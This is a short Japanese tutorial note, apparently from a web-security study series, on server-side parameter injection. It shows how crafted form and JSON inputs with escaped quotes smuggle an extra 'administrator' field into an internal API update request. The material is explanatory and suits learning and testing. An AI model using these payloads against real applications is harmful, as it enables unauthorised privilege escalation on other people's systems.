
## 入力欄にWebアプリが意図しない構造化データを注入する

### パターンA: 通常のパラメータと値

- 元のリクエスト
```http
POST /myaccount 
name=peter
```
- サーバ -> 内部API
```http
PATCH /users/7312/update 
{"name":"peter"}
```

- 👊構造化データの注入
```http
POST /myaccount 
name=peter", "valid_param":"administrator
```
- サーバ -> 内部API
```http
PATCH /users/7312/update 
{name="peter","valid_param":"administrator"}
```
- 有効なパラメタの発見は[3. ドキュメントにない隠されたパラメタの発見](../3.%20ドキュメントにない隠されたパラメタの発見.md)を参照

### パターンB: JSONのとき

- 元のリクエスト
```http
POST /myaccount
{"name": "peter"}
```
- サーバ -> 内部API
```http
PATCH /users/7312/update 
{"name":"peter"}
```

- 👊構造化データの注入(`"`はJSONにおいて特殊文字だがサーバ->内部APIへのリクエストはURLではないので、URLエンコードでなく`\`でエスケープする)
```http
POST /myaccount 
{"name": "peter\",\"valid_param\":\"administrator"}
```
- サーバ -> 内部API
```http
PATCH /users/7312/update 
{name="peter","valid_param":"administrator"}
```
